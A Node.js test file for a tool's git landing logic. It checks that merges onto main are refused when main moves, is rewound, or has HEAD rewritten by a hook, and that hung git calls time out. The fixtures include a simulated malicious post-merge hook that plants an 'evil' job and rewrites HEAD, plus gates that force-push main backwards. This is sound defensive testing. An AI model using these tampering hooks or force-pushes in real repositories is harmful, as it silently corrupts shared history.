// The job registry's landings (kit-162, the A15 "landing" tests; split from
// test/recurring-registry.test.mjs in final-14 F2, so each file runs well inside its watchdog): what
// the checks judged is what lands, under a main that moves, is rewound, or has a hook; a git call that
// hangs is killed at its timeout; a push killed at the timeout that origin then takes is recognised as
// the kit's own landing, and a look-alike never is; and records in home land by their own merge,
// lease and push. Each test is a fixture repo with a bare origin, run through the kit's commands.
// Run with TMUX unset: no fixture here starts or stops a tmux server.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { multiFixture, write, json, kit, gitShim, review, REAL_GIT } from './lib/kit.mjs';
import { SUP, QID, PROJ, JOBS, NOTES, GIT_TIMEOUT, check, jobsText, setup, refused, passes } from './fixtures/recurring-registry/shared.mjs';

// The land path's waits, kept short (final-14 F2): a git the shims hang, or a post-receive that sleeps,
// is killed at LAND_TIMEOUT, which every other git call of the landing still clears by far on a fixture
// repo; POST_SLEEP outlasts it more than twice.
const LAND_TIMEOUT = '3000';
const POST_SLEEP = 8;

test('A15 landing: forge git, main moves between the checks and the landing: refused, and main is left as the mover left it (final-4 F3)', () => {
  const T = setup('a15-moved');
  try {
    // a commit on top of main, on origin as another branch: the chore's gate pushes it to main, after
    // the checks and before the landing
    T.syncMain();
    write(path.join(T.old, NOTES), 'moved\n'); T.g(['add', NOTES]); T.g(['commit', '-qm', 'main moves']);
    const adv = T.g(['rev-parse', 'HEAD']);
    T.g(['push', '-q', 'origin', `${adv}:refs/heads/advance`]);
    T.g(['reset', '-q', '--hard', 'HEAD~1']);
    const wt = T.choreBranch('mover', (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), mover: `git push -q origin ${adv}:refs/heads/main` }; }, w));
    const head = T.g(['rev-parse', 'HEAD'], wt);
    refused(T.merge('mover'), /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'main is as the mover left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', head, 'origin/main']), 'the chore did not land');
  } finally { T.done(); }
});

test('A15 landing: forge github, main moves after the checks: refused before gh pr merge, main left as it is; unmoved, gh pr merge runs (final-4 F3)', () => {
  const T = setup('a15-moved-gh');
  try {
    // home's code lands through GitHub: settings forge "github", and a gh first on PATH that answers
    // the calls merge makes (pr view: one open, clean PR at the head; pr merge: logged only)
    T.onSettings((j) => { j.forge = 'github'; });
    const bin = path.join(T.base, 'bin-gh');
    const log = path.join(T.base, 'gh.log');
    const prFile = path.join(T.base, 'pr.json');
    write(path.join(bin, 'gh'), `#!/bin/sh\necho "$@" >> "${log}"\n[ "$1 $2" = "pr view" ] && exec cat "${prFile}"\n[ "$1 $2" = "pr merge" ] && exit 0\nexit 1\n`);
    fs.chmodSync(path.join(bin, 'gh'), 0o755);
    const env = { PATH: `${bin}${path.delimiter}${process.env.PATH}` };
    const calls = () => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8').split('\n').filter(Boolean) : []);
    const prMerges = () => calls().filter((c) => c.startsWith('pr merge '));
    const ghMerge = (slug, wt) => {
      const sha = T.g(['rev-parse', 'HEAD'], wt);
      write(prFile, JSON.stringify({ number: 7, headRefOid: sha, title: `chore-${slug}: jobs`, body: '## One-way doors\n\nNone.\n', isDraft: false, mergeStateStatus: 'CLEAN', url: 'https://example.test/pr/7', statusCheckRollup: [] }));
      fs.rmSync(log, { force: true });
      return { sha, r: T.merge(slug, [], env) };
    };
    T.syncMain();
    write(path.join(T.old, NOTES), 'moved\n'); T.g(['add', NOTES]); T.g(['commit', '-qm', 'main moves']);
    const adv = T.g(['rev-parse', 'HEAD']);
    T.g(['push', '-q', 'origin', `${adv}:refs/heads/advance`]);
    T.g(['reset', '-q', '--hard', 'HEAD~1']);
    const gate = (name, cmd) => (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), [name]: cmd }; }, w);
    const moved = ghMerge('mover', T.choreBranch('mover', gate('mover', `git push -q origin ${adv}:refs/heads/main`)));
    refused(moved.r, /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    assert.ok(calls().some((c) => c.startsWith('pr view ')), 'the stand-in answered the PR');
    assert.deepEqual(prMerges(), [], 'gh pr merge was never called');
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'main is as the mover left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', moved.sha, 'origin/main']), 'the chore did not land');
    // control: the same kind of chore, a gate that leaves main alone: gh pr merge runs, at the head
    const still = ghMerge('still', T.choreBranch('still', gate('still', 'true')));
    passes(still.r);
    assert.deepEqual(prMerges(), [`pr merge 7 --merge --match-head-commit ${still.sha}`]);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'the stand-in lands nothing');
    // the re-fetch before gh pr merge fails (a git that fails every fetch once the chore's gate has
    // run): refused, never read as main unmoved, and gh pr merge never runs (T3-1)
    const marker = path.join(T.base, 'fetches-fail');
    const shim = path.join(T.base, 'git-fetch-fails');
    write(path.join(shim, 'git'), `#!/bin/sh\nif [ -f "${marker}" ]; then case " $* " in *" fetch "*) echo "fatal: the test's fetch fails" >&2; exit 128 ;; esac; fi\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(shim, 'git'), 0o755);
    const nf = T.choreBranch('nofetch', gate('nofetch', `touch "${marker}"`));
    const nsha = T.g(['rev-parse', 'HEAD'], nf);
    write(prFile, JSON.stringify({ number: 7, headRefOid: nsha, title: 'chore-nofetch: jobs', body: '## One-way doors\n\nNone.\n', isDraft: false, mergeStateStatus: 'CLEAN', url: 'https://example.test/pr/7', statusCheckRollup: [] }));
    fs.rmSync(log, { force: true });
    const nr = T.merge('nofetch', [], { PATH: `${shim}${path.delimiter}${bin}${path.delimiter}${process.env.PATH}` });
    refused(nr, /couldn't fetch main to check it hasn't moved since the checks; run merge again/);
    assert.ok(fs.existsSync(marker), 'the gate ran');
    assert.deepEqual(prMerges(), [], 'gh pr merge was never called');
  } finally { T.done(); }
});

// A job that never had an answer, as a hook or a moved HEAD would write it.
const EVIL = '{"evil":{"kind":"check","title":"Evil","what":"x","every":"1h","run":"echo evil"}}';
// The commands that write it at the jobs file of the checkout git runs in, as a commit on HEAD's
// parents (-p … flags in $p), and move HEAD there; $G is the git to run.
const evilCommit = (p) => `printf '%s\\n' '${EVIL}' > ${JOBS}\n"$G" update-index --add ${JOBS}\nt=$("$G" write-tree)\nc=$("$G" commit-tree ${p} -m 'moved HEAD' "$t")\n"$G" update-ref HEAD "$c"\n`;

test('A15 landing: forge git, a hook the branch tracks (home has core.hooksPath .githooks) never runs in the landing merge: the judged merge lands, and no job (final-10 F1)', () => {
  const T = setup('a15-hook');
  try {
    // final-10's H1: home runs its hooks from a tracked dir (husky, a .githooks convention), and a
    // chore adds a post-merge hook there that writes a job and moves HEAD, after git merge
    const ran = path.join(T.base, 'hook-ran');
    T.g(['config', 'core.hooksPath', '.githooks']);
    T.choreBranch('hook', (wt) => {
      const h = path.join(wt, '.githooks/post-merge');
      write(h, `#!/bin/sh\n# runs inside the kit's landing merge, after the judged tree is merged\ntouch "${ran}"\nG=git\n${evilCommit('-p HEAD')}`);
      fs.chmodSync(h, 0o755);
    });
    const sha = T.headOf('chore-hook');
    const checked = T.g(['rev-parse', 'origin/main']);
    assert.equal(T.has('origin/chore-hook', JOBS), false, 'the judged head has no jobs file');
    // the hook file is outside project/: a chore lands it only with an owner's answer
    const gr = T.run(['ask', '--class', 'governance-edit', '--question', 'Should I add a post-merge git hook?', '--recommendation', 'Yes']);
    passes(gr);
    const gq = QID.exec(gr.out)[0];
    T.answer(gq);
    const spy = gitShim(T);
    const r = T.merge('hook', ['--approved', gq], spy.env);
    assert.equal(fs.existsSync(ran), false, 'the branch\'s hook never ran');
    passes(r);
    // what lands is the merge the checks judged: checked main and the head, and no job
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.has('origin/main', JOBS), false, 'no job landed on main');
    assert.equal(T.g(['rev-list', '--parents', '-n', '1', 'origin/main']).split(' ').slice(1).join(' '), `${checked} ${sha}`);
    assert.equal(T.g(['rev-parse', 'origin/main^{tree}']), T.g(['rev-parse', `${sha}^{tree}`]), 'the head\'s tree lands');
    assert.match(spy.calls(), /(^| )-c core\.hooksPath=\/dev\/null -c merge\.directoryRenames=conflict -c commit\.cleanup=verbatim merge --no-ff/m);
    assert.match(spy.calls(), /(^| )push --quiet --no-verify --force-with-lease=main:/m);
  } finally { T.done(); }
});

test('A15 landing: forge git, HEAD moved after the landing merge (as a hook that ran anyway would) is refused before the push: the merge must be the head onto the checked main, its jobs the judged ones (final-10 F1)', () => {
  const T = setup('a15-head');
  try {
    T.onMain(() => ({ aa: check({ title: 'A job' }) }));
    // a git that, after the kit's landing merge, moves HEAD as the mode file says: "jobs", to a
    // commit with the same two parents and a job no answer showed; "extra", to one more commit on
    // the merge, with the jobs left as they are
    const mode = path.join(T.base, 'head-mode');
    const dir = path.join(T.base, 'git-moves-head');
    write(path.join(dir, 'git'), `#!/bin/sh\nG="${REAL_GIT}"\ncase " $* " in\n  *" merge --no-ff --quiet "*)\n    "$G" "$@" || exit $?\n    case "$(cat "${mode}")" in\n      jobs)\n${evilCommit('-p HEAD^1 -p HEAD^2')}      ;;\n      extra)\n        echo x > hook-extra.txt\n        "$G" update-index --add hook-extra.txt\n        t=$("$G" write-tree)\n        c=$("$G" commit-tree -p HEAD -m 'moved HEAD' "$t")\n        "$G" update-ref HEAD "$c"\n      ;;\n    esac\n    exit 0 ;;\nesac\nexec "$G" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    const env = { PATH: `${dir}${path.delimiter}${process.env.PATH}` };
    for (const [how, re] of [
      ['jobs', /the landing merge at [0-9a-f]{12} lands other jobs \(recurring\.json\) than the checks judged; nothing pushed/],
      ['extra', /the landing merge at [0-9a-f]{12} is not the merge of [0-9a-f]{12} onto main at [0-9a-f]{12} the checks judged; nothing pushed/],
    ]) {
      T.choreBranch(how, (w) => write(path.join(w, NOTES), `${how}\n`));
      const before = T.g(['rev-parse', 'origin/main']);
      write(mode, `${how}\n`);
      refused(T.merge(how, [], env), re);
      T.g(['fetch', '-q', 'origin']);
      assert.equal(T.g(['rev-parse', 'origin/main']), before, `${how}: nothing pushed`);
      assert.deepEqual(T.mainJobs(), { aa: check({ title: 'A job' }) }, `${how}: no job landed`);
    }
  } finally { T.done(); }
});

test('A15 landing: forge git, main rewound between the checks and the landing: the lease refuses, and main is left as the rewinder left it (final-10 F2)', () => {
  const T = setup('a15-rewound');
  try {
    // two commits on main, and the chore's gate force-pushes main back to the first, after the checks
    // and before the landing: the landing merge still fast-forwards from there, so only the lease refuses it
    T.onMainFile('README.md', 'one\n');
    T.onMainFile('README.md', 'two\n');
    const back = T.g(['rev-parse', 'origin/main~1']);
    const wt = T.choreBranch('rewinder', (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), rewinder: `git push -q -f origin ${back}:refs/heads/main` }; }, w));
    const head = T.g(['rev-parse', 'HEAD'], wt);
    refused(T.merge('rewinder'), /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), back, 'main is as the rewinder left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', head, 'origin/main']), 'the chore did not land');
  } finally { T.done(); }
});

test('A15 landing: forge git, a landing push that hangs is killed at its timeout and refused, never waited on (final-10 F4)', { timeout: 300000 }, () => {
  const T = setup('a15-hang');
  try {
    // a git whose push to main never returns (a hung remote): exec, so the kill reaches the sleep
    // itself; the kit's git timeout cut to 3 s (DEVTEAM_GIT_TIMEOUT_MS), so the file stays short (final-14 F2)
    const dir = path.join(T.base, 'git-push-hangs');
    write(path.join(dir, 'git'), `#!/bin/sh\ncase " $* " in *" push --quiet --no-verify --force-with-lease="*) exec sleep 200 ;; esac\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    T.choreBranch('hang', (w) => write(path.join(w, NOTES), 'hang\n'));
    const before = T.g(['rev-parse', 'origin/main']);
    const t0 = Date.now();
    // a push killed at the timeout may still land, so merge says so and asks for a rerun (final-13 F1)
    const r = T.merge('hang', [], { PATH: `${dir}${path.delimiter}${process.env.PATH}`, DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    refused(r, /the code may have landed \(the push to main timed out before origin answered[^\n]*run merge --chore hang again/);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.ok(Date.now() - t0 < 100000, `refused at the timeout, before the hung push returned (${Date.now() - t0} ms)`);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), before, 'nothing landed');
  } finally { T.done(); }
});

test('A15 landing: forge git, a push origin takes but answers after the timeout is landed: merge finds its own checked merge on origin\'s main, logs the act, and the answer counts as landed (final-11 F3)', { timeout: 300000 }, () => {
  const T = setup('a15-slow-receive');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('slow', () => ({ aa: check() }));
    // origin's post-receive outlasts the kit's git timeout (cut to 3 s): the ref is updated, and
    // the push is killed before it answers
    const hook = path.join(T.org, 'hooks', 'post-receive');
    write(hook, `#!/bin/sh\nexec sleep ${POST_SLEEP} >/dev/null 2>&1\n`);
    fs.chmodSync(hook, 0o755);
    const before = T.acts().length;
    const r = T.merge('slow', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    fs.rmSync(hook, { force: true });
    passes(r);
    assert.match(r.text, /the push to main timed out, but origin's main is the landing merge the kit built and checked \([0-9a-f]{12}\): landed/);
    const added = T.acts().slice(before);
    assert.equal(added.length, 1, JSON.stringify(added));
    assert.equal(added[0].class, 'merge-chore');
    assert.equal(added[0].approved_by, q);
    assert.deepEqual(T.mainJobs(), { aa: check() });
    const s = json(T.ok(['recurring', 'show', 'aa', '--json']));
    assert.equal(s.registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

test('A15 landing: forge git, a landing merge that hangs is killed at its timeout and refused, with nothing pushed (final-11 F4)', { timeout: 300000 }, () => {
  const T = setup('a15-merge-hangs');
  try {
    // a git whose landing merge never returns: exec, so the kill reaches the sleep itself
    const dir = path.join(T.base, 'git-merge-hangs');
    write(path.join(dir, 'git'), `#!/bin/sh\ncase " $* " in *" merge --no-ff --quiet "*) exec sleep 200 ;; esac\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    T.choreBranch('mhang', (w) => write(path.join(w, NOTES), 'mhang\n'));
    const before = T.g(['rev-parse', 'origin/main']);
    const acts = T.acts().length;
    const t0 = Date.now();
    // it says it timed out, never that the head doesn't merge (final-11 F6)
    const r = T.merge('mhang', [], { PATH: `${dir}${path.delimiter}${process.env.PATH}`, DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    refused(r, /the landing merge of [0-9a-f]{12} onto main timed out; nothing pushed/);
    assert.doesNotMatch(r.text, /does not merge/);
    assert.ok(Date.now() - t0 < 100000, `refused at the timeout, before the hung merge returned (${Date.now() - t0} ms)`);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), before, 'nothing pushed');
    assert.equal(T.acts().length, acts, 'nothing logged');
  } finally { T.done(); }
});

// Records in home (links.console.records "home"): a console ticket's records land on home's main
// from home's ticket/<id> (landRecords), ahead of its code. Records never change the jobs (final-11 F1).
function recordsHome(name) {
  const F = multiFixture(name);
  const links = json(F.okIn(F.old, ['settings'])).links;
  F.lines({ ...F.STD, console: { link: 'console' }, companion: { link: 'companion' } }, { links: { ...links, console: { ...links.console, records: 'home' } } });
  const { old, g } = F;
  const date = (d) => ({ ...process.env, GIT_COMMITTER_DATE: d, GIT_AUTHOR_DATE: d });
  const gd = (args, cwd, d) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout: GIT_TIMEOUT, env: date(d) }).trim();
  const text = (r) => ({ status: r.status, text: `${r.out}\n${r.err}` });
  // console's ticket/<id>: the code
  const code = (id) => {
    F.ticket(id);
    const w = path.join(old, '.worktrees', id);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, w, 'origin/trunk'], F.console);
    write(path.join(w, 'src/main.js'), `${id}\n`);
    g(['add', '-A'], w); g(['commit', '-qm', `${id}: work`], w); g(['push', '-q', 'origin', `ticket/${id}`], w);
    write(path.join(old, `docs/devteam/run/pr/ticket/${id}.md`), `# ${id}: work\n\n## One-way doors\n\nNone.\n`);
    return g(['rev-parse', 'HEAD'], w);
  };
  // the records on home's ticket/<id> (its worktree rw, already at the history wanted): spec, plan and
  // verification, approved, then a final review naming the code and the records
  const records = (id, rw, codeSha) => {
    const T = path.join(rw, 'docs/devteam/project/tickets', id);
    write(path.join(T, 'spec.md'), '# spec\n'); write(path.join(T, 'plan.md'), '# plan\n\n## TL;DR\n\n- x\n');
    write(path.join(T, 'verification.md'), '| Done-when | Command | Result |\n|---|---|---|\n| s | t | pass |\n');
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: records`], rw);
    const rec = g(['rev-parse', 'HEAD'], rw);
    F.okIn(old, ['act', '--class', 'approve-spec', '--refs', id, '--', 'ok'], SUP);
    F.okIn(old, ['act', '--class', 'approve-plan', '--refs', id, '--', 'ok'], SUP);
    write(path.join(T, 'reviews/final-1.md'), `- Records: ${rec}\n${review('reviewer-b', codeSha)}`);
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: final review`], rw); g(['push', '-q', '-f', 'origin', `ticket/${id}`], rw);
    return g(['rev-parse', 'HEAD'], rw);
  };
  const mainNow = () => { g(['fetch', '-q', 'origin'], old); return g(['rev-parse', 'origin/main'], old); };
  const jobsAt = (ref) => { try { return JSON.parse(g(['show', `${ref}:${JOBS}`], old)); } catch { return {}; } };
  const done = () => { if (!process.env.DEVTEAM_TEST_KEEP) fs.rmSync(F.base, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }); };
  return { ...F, gd, text, code, records, mainNow, jobsAt, done };
}

test('A15 landing: records in home, a criss-cross records branch that would land a stopped job again is refused, and home\'s main is left as it is (final-11 F1)', () => {
  const F = recordsHome('recur-records-cc');
  const { old, g, gd } = F;
  const id = 'console-01-a';
  try {
    const codeSha = F.code(id);
    // home's main: O holds a job, then Y1 stops it (the owner's answered stop; by hand here)
    g(['fetch', '-q', 'origin'], old);
    const m = path.join(old, '.worktrees', 'cc-main');
    g(['worktree', 'add', '-q', '-b', 'cc-main', m, 'origin/main'], old);
    write(path.join(m, JOBS), jobsText({ old: check() }));
    g(['add', '-A'], m); g(['commit', '-qm', 'O: a job'], m);
    const O = g(['rev-parse', 'HEAD'], m);
    write(path.join(m, JOBS), jobsText({}));
    g(['commit', '-qam', 'Y1: the job stopped'], m);
    const Y1 = g(['rev-parse', 'HEAD'], m);
    // X1, off O, touches only the ticket's own folder, with a later committer date (so git's single
    // merge base is X1); main merges it
    const x = path.join(old, '.worktrees', 'cc-side');
    g(['worktree', 'add', '-q', '-b', 'cc-side', x, O], old);
    write(path.join(x, `docs/devteam/project/tickets/${id}/earlier.md`), 'earlier\n');
    g(['add', '-A'], x); gd(['commit', '-qm', 'X1: an earlier landing of the records'], x, '2030-01-05T00:00:00');
    const X1 = g(['rev-parse', 'HEAD'], x);
    g(['merge', '-q', '--no-ff', '--no-edit', X1], m);
    g(['push', '-q', 'origin', 'HEAD:main'], m);
    // the records branch: an evil merge of X1 and Y1 that keeps X1's jobs file, then the records
    const rw = path.join(old, '.worktrees', `records-${id}`);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, X1], old);
    try { g(['merge', '-q', '--no-ff', '--no-commit', Y1], rw); } catch {}
    g(['checkout', X1, '--', JOBS], rw);
    g(['commit', '-qm', 'records (evil merge)'], rw);
    const head = F.records(id, rw, codeSha);
    const before = F.mainNow();
    assert.deepEqual(F.jobsAt(before), {}, 'main has the job stopped');
    assert.equal(g(['merge-base', '--all', before, head], old).split('\n').length, 2, 'a criss-cross: two merge bases');
    // what plain git lands: the stopped job, back
    g(['checkout', '-q', '-b', 'cc-plain', before], m);
    g(['merge', '-q', '--no-ff', '--no-edit', head], m);
    assert.ok(Object.hasOwn(F.jobsAt('cc-plain'), 'old'), 'plain git lands the stopped job again');
    const MULTI = new RegExp(`home's ticket/${id} has 2 merge bases with home's main`);
    refused(F.text(F.runIn(old, ['check-pr', '--head-ref', `ticket/${id}`, '--sha', head])), MULTI);
    refused(F.text(F.runIn(old, ['merge', id], SUP)), MULTI);
    assert.equal(F.mainNow(), before, "home's main is as it was");
    assert.deepEqual(F.jobsAt('origin/main'), {}, 'no job landed');
  } finally { F.done(); }
});

test('A15 landing: records in home behind a main that changed the jobs are refused until main is merged in; then they land, with main\'s jobs (final-11 F1)', () => {
  const F = recordsHome('recur-records-behind');
  const { old, g } = F;
  const id = 'console-01-a';
  try {
    const codeSha = F.code(id);
    g(['fetch', '-q', 'origin'], old);
    const rw = path.join(old, '.worktrees', `records-${id}`);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, 'origin/main'], old);
    // main gains a job after the records branch parts from it
    const m = path.join(old, '.worktrees', 'jobs-main');
    g(['worktree', 'add', '-q', '-b', 'jobs-main', m, 'origin/main'], old);
    write(path.join(m, JOBS), jobsText({ aa: check() }));
    g(['add', '-A'], m); g(['commit', '-qm', 'main: a job'], m); g(['push', '-q', 'origin', 'HEAD:main'], m);
    F.records(id, rw, codeSha);
    const before = F.mainNow();
    refused(F.text(F.runIn(old, ['merge', id, '--dry-run'], SUP)), new RegExp(`home's ticket/${id}: recurring\\.json: this branch doesn't contain main's tip, and it or main changed a recurring\\.json since they parted; merge main into the branch first`));
    assert.equal(F.mainNow(), before);
    // main merged in: the records land, and the jobs are main's
    g(['fetch', '-q', 'origin'], rw);
    g(['merge', '-q', '--no-ff', '--no-edit', 'origin/main'], rw);
    const T = path.join(rw, 'docs/devteam/project/tickets', id, 'reviews/final-2.md');
    write(T, `- Records: ${g(['rev-parse', 'HEAD'], rw)}\n${review('reviewer-c', codeSha)}`);
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: final review again`], rw); g(['push', '-q', 'origin', `ticket/${id}`], rw);
    const ok = F.runIn(old, ['merge', id], SUP);
    assert.equal(ok.status, 0, `${ok.out}\n${ok.err}`);
    assert.match(ok.out, /landed the records of console-01-a/);
    g(['cat-file', '-e', `origin/main:docs/devteam/project/tickets/${id}/spec.md`], old);
    assert.deepEqual(F.jobsAt('origin/main'), { aa: check() }, "main's jobs, as they were");
  } finally { F.done(); }
});

// ---- landRecords, the records path's own landing (final-12 F1, F3) ----
// a git that acts only in the records landing merge (its message names "Merged home's ticket/")
const recShim = (F, name, body) => {
  const dir = path.join(F.base, `git-${name}`);
  write(path.join(dir, 'git'), `#!/bin/sh\nG="${REAL_GIT}"\ncase " $* " in\n  *" merge --no-ff --quiet -m "*"Merged home's ticket/"*)\n${body}\n  ;;\nesac\nexec "$G" "$@"\n`);
  fs.chmodSync(path.join(dir, 'git'), 0o755);
  return { PATH: `${dir}${path.delimiter}${process.env.PATH}` };
};
// console's code on its ticket branch, and home's ticket/<id> with the records off home's main
const recordsReady = (F, id) => {
  const codeSha = F.code(id);
  F.g(['fetch', '-q', 'origin'], F.old);
  const rw = path.join(F.old, '.worktrees', `records-${id}`);
  F.g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, 'origin/main'], F.old);
  return { codeSha, rw, head: F.records(id, rw, codeSha) };
};
// one commit on home's main, pushed straight to origin
let homeN = 0;
const onHomeMain = (F, rel, body, msg) => {
  const m = path.join(F.old, '.worktrees', `hm-${++homeN}`);
  F.g(['fetch', '-q', 'origin'], F.old);
  F.g(['worktree', 'add', '-q', '--detach', m, 'origin/main'], F.old);
  write(path.join(m, rel), body);
  F.g(['add', '-A'], m); F.g(['commit', '-qm', msg], m); F.g(['push', '-q', 'origin', 'HEAD:main'], m);
  return F.g(['rev-parse', 'HEAD'], m);
};
const RID = 'console-01-a';

test('A15 landing: records in home, home\'s main rewound between the checks and the records landing: the lease refuses, and main is left as the rewinder left it (final-12 F1)', () => {
  const F = recordsHome('recur-rec-rewind');
  try {
    onHomeMain(F, `${PROJ}/notes-a.md`, 'a\n', 'one');
    onHomeMain(F, `${PROJ}/notes-b.md`, 'b\n', 'two');
    recordsReady(F, RID);
    F.mainNow();
    const back = F.g(['rev-parse', 'origin/main~1'], F.old);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP, recShim(F, 'rewind', `    "$G" push -q -f origin ${back}:refs/heads/main >/dev/null 2>&1`)));
    refused(r, /push to home's main refused/);
    assert.equal(F.mainNow(), back, 'main as the rewinder left it');
  } finally { F.done(); }
});

test('A15 landing: records in home, HEAD moved after the records merge (a new job on the same parents, or a commit on top) is refused before the push (final-12 F1)', () => {
  for (const how of ['jobs', 'extra']) {
    const F = recordsHome(`recur-rec-head-${how}`);
    try {
      recordsReady(F, RID);
      const before = F.mainNow();
      const after = how === 'jobs'
        ? `    "$G" "$@" || exit $?\n${evilCommit('-p HEAD^1 -p HEAD^2')}    exit 0`
        : '    "$G" "$@" || exit $?\n    echo x > hook-extra.txt\n    "$G" update-index --add hook-extra.txt\n    t=$("$G" write-tree)\n    c=$("$G" commit-tree -p HEAD -m moved "$t")\n    "$G" update-ref HEAD "$c"\n    exit 0';
      const r = F.text(F.runIn(F.old, ['merge', RID], SUP, recShim(F, `head-${how}`, after)));
      refused(r, how === 'jobs' ? /lands other jobs \(recurring\.json\) than home's main has/ : /the records merge at [0-9a-f]{12} is not home's ticket/);
      assert.equal(F.mainNow(), before, `${how}: nothing pushed`);
      assert.deepEqual(F.jobsAt('origin/main'), {}, `${how}: no job landed`);
    } finally { F.done(); }
  }
});

test('A15 landing: records in home, a records merge that hangs is killed at its timeout and refused, with nothing pushed (final-12 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-hang');
  try {
    recordsReady(F, RID);
    const before = F.mainNow();
    const t0 = Date.now();
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP, { ...recShim(F, 'hang', '    exec sleep 200'), DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT }));
    refused(r, /timed out; nothing pushed/);
    assert.ok(Date.now() - t0 < 100000, `killed at its timeout, not waited on (${Date.now() - t0} ms)`);
    assert.equal(F.mainNow(), before);
  } finally { F.done(); }
});

test('A15 landing: records in home, a post-merge hook from home\'s core.hooksPath never runs in the records merge (final-12 F1)', () => {
  const F = recordsHome('recur-rec-hook');
  try {
    recordsReady(F, RID);
    const hooks = path.join(F.base, 'abs-hooks');
    const ran = path.join(F.base, 'hook-ran');
    write(path.join(hooks, 'post-merge'), `#!/bin/sh\ntouch "${ran}"\n`);
    fs.chmodSync(path.join(hooks, 'post-merge'), 0o755);
    F.g(['config', 'core.hooksPath', hooks], F.old);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r.status, 0, r.text);
    assert.match(r.text, /landed the records of console-01-a/);
    assert.equal(fs.existsSync(ran), false, 'the hook never ran');
  } finally { F.done(); }
});

test('A15 landing: records in home, a records push origin takes but answers after the timeout is landed: merge finds the records merge on home\'s main, logs their act, and lands the code (final-12 F3)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-slow');
  try {
    const { head } = recordsReady(F, RID);
    const hook = path.join(F.org, 'hooks', 'post-receive');
    write(hook, `#!/bin/sh\nexec sleep ${POST_SLEEP} >/dev/null 2>&1\n`);
    fs.chmodSync(hook, 0o755);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try { r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT })); } finally { fs.rmSync(hook, { force: true }); }
    assert.equal(r.status, 0, r.text);
    assert.match(r.text, /but origin's main is the records merge the kit built and checked \([0-9a-f]{12}\): landed/);
    assert.match(r.text, /landed the records of console-01-a/);
    F.g(['merge-base', '--is-ancestor', head, F.mainNow()], F.old);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once');
  } finally { F.done(); }
});

// ---- a push killed at the timeout that origin then takes (final-13 F1) ----
// origin's pre-receive outlasts the kit's git timeout (cut to 2 s): the push is killed before
// origin updates the ref, and origin then takes it. The first run says it may have landed; the rerun
// recognises the kit's own landing merge and logs its act once.
const PRE_SLEEP = 4;
const PRE_TIMEOUT = '2000';
const nap = (ms) => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
const slowPreReceive = (origin) => { const hook = path.join(origin, 'hooks', 'pre-receive'); write(hook, `#!/bin/sh\ncat >/dev/null\nexec sleep ${PRE_SLEEP} >/dev/null 2>&1\n`); fs.chmodSync(hook, 0o755); return hook; };
// until the bare origin's branch is no longer at `from` (or 40 s pass); returns where it is
const refMoves = (origin, branch, from) => {
  const at = () => execFileSync('git', ['rev-parse', `refs/heads/${branch}`], { cwd: origin, encoding: 'utf8', timeout: GIT_TIMEOUT }).trim();
  for (let i = 0; i < 80 && at() === from; i++) nap(500);
  return at();
};
const MAYBE = /may have landed[^\n]*timed out before origin answered[^\n]*run merge [^\n]*again; it recognises the kit's own/;

